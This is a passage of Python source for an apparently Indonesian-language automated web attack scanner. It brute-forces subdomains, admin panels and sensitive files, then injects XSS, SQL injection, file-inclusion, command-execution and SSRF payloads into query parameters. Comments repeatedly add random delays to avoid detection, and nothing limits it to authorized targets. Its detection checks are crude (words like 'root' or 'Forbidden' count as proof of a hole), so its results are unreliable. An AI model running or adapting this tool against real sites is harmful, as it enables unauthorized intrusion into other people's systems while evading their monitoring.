            "intranet", "intern", "internal", "internet", "db", "database",
            "old", "new", "test1", "test2", "test3", "dev1", "dev2", "dev3",
            "staging1", "staging2", "staging3", "api1", "api2", "api3",
            "secure1", "secure2", "secure3", "admin1", "admin2", "admin3",
            "mail1", "mail2", "mail3", "web1", "web2", "web3", "app1", "app2",
            "app3", "mobile1", "mobile2", "mobile3", "static1", "static2",
            "static3", "media1", "media2", "media3", "cdn4", "cdn5", "cdn6",
            "mssql", "oracle", "postgres", "redis", "mongodb", "couchdb",
            "elasticsearch", "kibana", "grafana", "prometheus", "jenkins",
            "gitlab", "github", "bitbucket", "jira", "confluence", "nexus",
            "sonar", "splunk", "vcenter", "vmware", "k8s", "kubernetes",
            "docker", "swarm", "consul", "vault", "rabbitmq", "activemq",
            "zookeeper", "kafka", "nfs", "samba", "ldap", "ad", "radius",
            "vpn1", "vpn2", "vpn3", "owa", "exchange", "outlook", "activedirectory",
            "auth", "authentication", "sso", "oauth", "openid", "login", "signin",
            "account", "accounts", "billing", "pay", "payment", "payments", "checkout",
            "cart", "shop", "store", "ecommerce", "market", "marketing", "ads",
            "advertising", "analytics", "stats", "statistics", "monitor", "monitoring",
            "log", "logs", "logger", "logging", "error", "errors", "debug", "devtools",
            "tools", "util", "utility", "utilities", "config", "configuration", "setup",
            "install", "update", "upgrade", "patch", "migrate", "migration", "backup",
            "restore", "recovery", "archive", "archives", "data", "database", "db",
            "dbs", "sql", "nosql", "mongo", "redis", "memcached", "cache", "caching",
            "queue", "job", "jobs", "worker", "workers", "task", "tasks", "schedule",
            "scheduler", "cron", "batch", "process", "processing", "service", "services",
            "api-gateway", "gateway", "proxy", "reverse", "loadbalancer", "lb", "firewall",
            "fw", "security", "secure", "vault", "secret", "secrets", "key", "keys",
            "token", "tokens", "cert", "certs", "certificate", "certificates", "ssl",
            "tls", "crypto", "encryption", "decryption", "sign", "signature", "verify",
            "validation", "validator", "authz", "authn", "permission", "permissions",
            "role", "roles", "policy", "policies", "admin", "administrator", "root",
            "superuser", "sysadmin", "operator", "manager", "support", "help", "helpdesk",
            "customer", "client", "user", "users", "profile", "profiles", "account",
            "accounts", "billing", "invoice", "invoices", "payment", "payments", "order",
            "orders", "purchase", "purchases", "cart", "checkout", "shop", "store",
            "ecommerce", "product", "products", "catalog", "inventory", "stock", "warehouse",
            "supply", "supplier", "vendor", "vendors", "partner", "partners", "affiliate",
            "affiliates", "reseller", "resellers", "distributor", "distributors", "dealer",
            "dealers", "retailer", "retailers", "wholesale", "wholesaler", "manufacturer",
            "factory", "production", "logistics", "shipping", "delivery", "tracking",
            "shipment", "shipments", "fulfillment", "warehouse", "inventory", "stock"
        ]

    async def full_scan(self, url):
        """Jalankan pemindaian komprehensif"""
        results = {
            "admin_panels": [],
            "sensitive_files": [],
            "vulnerable_endpoints": [],
            "crawled_links": [],
            "subdomains": [],
            "xss_vulnerabilities": [],
            "sql_injections": [],
            "lfi_vulnerabilities": [],
            "rce_vulnerabilities": [],
            "ssrf_vulnerabilities": []
        }

        # Normalisasi URL
        base_url = self.normalize_url(url)
        domain = urlparse(base_url).netloc
        
        # Step 1: Enumerasi subdomain
        results["subdomains"] = await self.enumerate_subdomains(domain)
        
        # Step 2: Crawling dasar
        results["crawled_links"] = await self.crawl_site(base_url)
        
        # Step 3: Deteksi admin panels
        results["admin_panels"] = await self.detect_admin_panels(base_url)
        
        # Step 4: Deteksi file sensitif
        results["sensitive_files"] = await self.find_sensitive_files(base_url)
        
        # Step 5: Scan kerentanan XSS
        results["xss_vulnerabilities"] = await self.scan_xss_vulnerabilities(results["crawled_links"])
        
        # Step 6: Scan kerentanan SQLi
        results["sql_injections"] = await self.scan_sql_injections(results["crawled_links"])
        
        # Step 7: Scan kerentanan LFI
        results["lfi_vulnerabilities"] = await self.scan_lfi_vulnerabilities(results["crawled_links"])
        
        # Step 8: Scan kerentanan RCE
        results["rce_vulnerabilities"] = await self.scan_rce_vulnerabilities(results["crawled_links"])
        
        # Step 9: Scan kerentanan SSRF
        results["ssrf_vulnerabilities"] = await self.scan_ssrf_vulnerabilities(results["crawled_links"])
        
        return results

    def normalize_url(self, url):
        """Pastikan URL memiliki skema dan tidak diakhiri slash"""
        if not url.startswith("http"):
            url = "http://" + url
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"

    async def crawl_site(self, base_url):
        """Crawl dasar untuk menemukan link internal"""
        try:
            # Tambahkan delay acak untuk menghindari deteksi
            await asyncio.sleep(random.uniform(0.5, 2.0))
            
            response = self.session.get(base_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            links = set()
            
            for tag in soup.find_all(['a', 'link', 'form', 'script', 'img'], href=True):
                href = tag['href']
                full_url = urljoin(base_url, href)
                
                # Filter hanya URL yang relevan
                if self.is_same_domain(base_url, full_url):
                    links.add(full_url)
            
            # Tambahkan URL dari form action
            for form in soup.find_all('form', action=True):
                action = form['action']
                full_url = urljoin(base_url, action)
                if self.is_same_domain(base_url, full_url):
                    links.add(full_url)
                    
            return list(links)[:100]  # Batasi 100 URL pertama
        except Exception as e:
            print(f"Crawling error: {str(e)}")
            return []

    async def detect_admin_panels(self, base_url):
        """Deteksi admin panel dengan teknik hybrid"""
        found_panels = []
        
        # Teknik 1: Coba path umum (dictionary attack)
        for path in self.common_admin_paths:
            # Tambahkan delay acak untuk menghindari deteksi
            await asyncio.sleep(random.uniform(0.1, 0.3))
            
            test_url = urljoin(base_url, path)
            if await self.check_admin_panel(test_url):
                found_panels.append(test_url)
        
        return found_panels

    async def check_admin_panel(self, url):
        """Verifikasi apakah URL adalah admin panel"""
        try:
            response = self.session.get(url, timeout=5, allow_redirects=False)
            
            # Ciri-ciri halaman login/admin
            if response.status_code == 200:
                content = response.text.lower()
                
                # Deteksi berdasarkan konten
                login_indicators = [
                    "login", "sign in", "username", "password",
                    "admin panel", "dashboard", "control panel",
                    "administrator", "backend", "cp", "manager"
                ]
                
                if any(indicator in content for indicator in login_indicators):
                    return True
                
                # Deteksi berdasarkan form password
                if "<input type=\"password\"" in content:
                    return True
                
                # Deteksi berdasarkan judul halaman
                if "<title>" in content:
                    title = content.split("<title>")[1].split("</title>")[0]
                    if any(kw in title for kw in ["login", "admin", "dashboard", "control panel"]):
                        return True
            
            return False
        except:
            return False

    async def find_sensitive_files(self, base_url):
        """Cari file konfigurasi dan backup sensitif"""
        found_files = []
        
        for file_path in self.common_files:
            # Tambahkan delay acak untuk menghindari deteksi
            await asyncio.sleep(random.uniform(0.05, 0.1))
            
            test_url = urljoin(base_url, file_path)
            if await self.check_sensitive_file(test_url):
                found_files.append(test_url)
                
        return found_files

    async def check_sensitive_file(self, url):
        """Verifikasi keberadaan file sensitif"""
        try:
            response = self.session.head(url, timeout=5, allow_redirects=False)
            
            # File ditemukan (status 200) atau terlarang (status 403)
            if response.status_code in [200, 403]:
                return True
                
            return False
        except:
            return False

    async def enumerate_subdomains(self, domain):
        """Enumerasi subdomain dengan DNS lookup"""
        tasks = []
        for sub in self.subdomain_wordlist:
            full_domain = f"{sub}.{domain}"
            tasks.append(self.resolve_subdomain(full_domain))
        
        results = await asyncio.gather(*tasks)
        return [result for result in results if result]

    async def resolve_subdomain(self, domain):
        """Cek keberadaan subdomain melalui DNS"""
        try:
            await self.dns_resolver.query(domain, 'A')
            return domain
        except aiodns.error.DNSError:
            return None

    async def scan_xss_vulnerabilities(self, urls):
        """Scan kerentanan XSS pada kumpulan URL"""
        vulnerabilities = []
        tasks = []
        
        for url in urls:
            if '?' in url:  # Hanya URL dengan parameter
                tasks.append(self.test_xss(url))
        
        results = await asyncio.gather(*tasks)
        
        for url, payload, is_vulnerable in results:
            if is_vulnerable:
                vulnerabilities.append({
                    "url": url,
                    "payload": payload,
                    "vulnerable": True
                })
        
        return vulnerabilities

    async def test_xss(self, url):
        """Uji kerentanan XSS pada URL tertentu"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            return (url, "", False)
        
        # Pilih payload secara acak
        payload = random.choice(self.xss_payloads)
        
        # Buat URL baru dengan payload
        new_query = {}
        for param, values in query_params.items():
            new_query[param] = payload
        
        new_query_str = urlencode(new_query, doseq=True)
        target_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query_str,
            parsed_url.fragment
        ))
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    target_url, 
                    headers={"User-Agent": self.session.headers["User-Agent"]},
                    timeout=5,
                    ssl=False
                ) as response:
                    response_text = await response.text()
                    
                    # Deteksi apakah payload dieksekusi
                    is_vulnerable = payload in response_text
                    return (url, payload, is_vulnerable)
        except:
            return (url, payload, False)

    async def scan_sql_injections(self, urls):
        """Scan kerentanan SQL injection pada kumpulan URL"""
        vulnerabilities = []
        tasks = []
        
        for url in urls:
            if '?' in url:  # Hanya URL dengan parameter
                tasks.append(self.test_sql_injection(url))
        
        results = await asyncio.gather(*tasks)
        
        for url, payload, is_vulnerable in results:
            if is_vulnerable:
                vulnerabilities.append({
                    "url": url,
                    "payload": payload,
                    "vulnerable": True
                })
        
        return vulnerabilities

    async def test_sql_injection(self, url):
        """Uji kerentanan SQL injection pada URL tertentu"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            return (url, "", False)
        
        # Pilih payload secara acak
        payload = random.choice(self.sql_payloads)
        
        # Buat URL baru dengan payload
        new_query = {}
        for param, values in query_params.items():
            new_query[param] = payload
        
        new_query_str = urlencode(new_query, doseq=True)
        target_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query_str,
            parsed_url.fragment
        ))
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    target_url, 
                    headers={"User-Agent": self.session.headers["User-Agent"]},
                    timeout=5,
                    ssl=False
                ) as response:
                    response_text = await response.text()
                    
                    # Deteksi error messages yang mengindikasikan SQLi
                    sql_errors = [
                        "SQL syntax", "MySQL server", "ORA-", "syntax error",
                        "unclosed quotation mark", "PostgreSQL", "Microsoft Access",
                        "ODBC", "JDBC", "SQLite", "MariaDB", "SQL error", "mysql_fetch",
                        "pg_query", "sqlsrv_query", "oci_parse", "SQLite3::query"
                    ]
                    
                    is_vulnerable = any(error in response_text for error in sql_errors)
                    return (url, payload, is_vulnerable)
        except:
            return (url, payload, False)

    async def scan_lfi_vulnerabilities(self, urls):
        """Scan kerentanan Local File Inclusion"""
        vulnerabilities = []
        tasks = []
        
        for url in urls:
            if '?' in url:  # Hanya URL dengan parameter
                tasks.append(self.test_lfi(url))
        
        results = await asyncio.gather(*tasks)
        
        for url, payload, is_vulnerable in results:
            if is_vulnerable:
                vulnerabilities.append({
                    "url": url,
                    "payload": payload,
                    "vulnerable": True
                })
        
        return vulnerabilities

    async def test_lfi(self, url):
        """Uji kerentanan LFI pada URL tertentu"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            return (url, "", False)
        
        # Pilih payload secara acak
        payload = random.choice(self.lfi_payloads)
        
        # Buat URL baru dengan payload
        new_query = {}
        for param, values in query_params.items():
            new_query[param] = payload
        
        new_query_str = urlencode(new_query, doseq=True)
        target_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query_str,
            parsed_url.fragment
        ))
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    target_url, 
                    headers={"User-Agent": self.session.headers["User-Agent"]},
                    timeout=5,
                    ssl=False
                ) as response:
                    response_text = await response.text()
                    
                    # Deteksi isi file yang dibocorkan
                    lfi_indicators = [
                        "root:", "daemon:", "bin:", "sys:", "adm:", "mysql:",
                        "<?php", "<?=", "<? ", "<%", "<script", "DOCTYPE html",
                        "Windows Registry", "Microsoft Corp", "Microsoft Windows",
                        "Program Files", "boot loader", "boot.ini", "[boot loader]"
                    ]
                    
                    is_vulnerable = any(indicator in response_text for indicator in lfi_indicators)
                    return (url, payload, is_vulnerable)
        except:
            return (url, payload, False)

    async def scan_rce_vulnerabilities(self, urls):
        """Scan kerentanan Remote Code Execution"""
        vulnerabilities = []
        tasks = []
        
        for url in urls:
            if '?' in url:  # Hanya URL dengan parameter
                tasks.append(self.test_rce(url))
        
        results = await asyncio.gather(*tasks)
        
        for url, payload, is_vulnerable in results:
            if is_vulnerable:
                vulnerabilities.append({
                    "url": url,
                    "payload": payload,
                    "vulnerable": True
                })
        
        return vulnerabilities

    async def test_rce(self, url):
        """Uji kerentanan RCE pada URL tertentu"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            return (url, "", False)
        
        # Pilih payload secara acak
        payload = random.choice(self.rce_payloads)
        
        # Buat URL baru dengan payload
        new_query = {}
        for param, values in query_params.items():
            new_query[param] = payload
        
        new_query_str = urlencode(new_query, doseq=True)
        target_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query_str,
            parsed_url.fragment
        ))
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    target_url, 
                    headers={"User-Agent": self.session.headers["User-Agent"]},
                    timeout=5,
                    ssl=False
                ) as response:
                    response_text = await response.text()
                    
                    # Deteksi output perintah
                    rce_indicators = [
                        "uid=", "gid=", "groups=", "root", "Administrator",
                        "Microsoft Windows", "Linux", "Darwin", "bin bash",
                        "cmd.exe", "powershell.exe", "Command Prompt", "Terminal"
                    ]
                    
                    is_vulnerable = any(indicator in response_text for indicator in rce_indicators)
                    return (url, payload, is_vulnerable)
        except:
            return (url, payload, False)

    async def scan_ssrf_vulnerabilities(self, urls):
        """Scan kerentanan Server-Side Request Forgery"""
        vulnerabilities = []
        tasks = []
        
        for url in urls:
            if '?' in url:  # Hanya URL dengan parameter
                tasks.append(self.test_ssrf(url))
        
        results = await asyncio.gather(*tasks)
        
        for url, payload, is_vulnerable in results:
            if is_vulnerable:
                vulnerabilities.append({
                    "url": url,
                    "payload": payload,
                    "vulnerable": True
                })
        
        return vulnerabilities

    async def test_ssrf(self, url):
        """Uji kerentanan SSRF pada URL tertentu"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            return (url, "", False)
        
        # Pilih payload secara acak
        payload = random.choice(self.ssrf_payloads)
        
        # Buat URL baru dengan payload
        new_query = {}
        for param, values in query_params.items():
            new_query[param] = payload
        
        new_query_str = urlencode(new_query, doseq=True)
        target_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query_str,
            parsed_url.fragment
        ))
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    target_url, 
                    headers={"User-Agent": self.session.headers["User-Agent"]},
                    timeout=5,
                    ssl=False
                ) as response:
                    response_text = await response.text()
                    
                    # Deteksi respons dari internal service
                    ssrf_indicators = [
                        "EC2 Metadata", "Metadata Service", "Google Metadata",
                        "Azure Instance Metadata", "Internal Server Error",
                        "localhost", "127.0.0.1", "0.0.0.0", "internal",
                        "private", "Forbidden", "Unauthorized", "Access Denied"
                    ]
                    
                    is_vulnerable = any(indicator in response_text for indicator in ssrf_indicators)
                    return (url, payload, is_vulnerable)
        except:
            return (url, payload, False)

    def is_same_domain(self, base_url, test_url):
        """Cek apakah URL masih dalam domain yang sama"""
        base_domain = urlparse(base_url).netloc
        test_domain = urlparse(test_url).netloc
        return base_domain == test_domain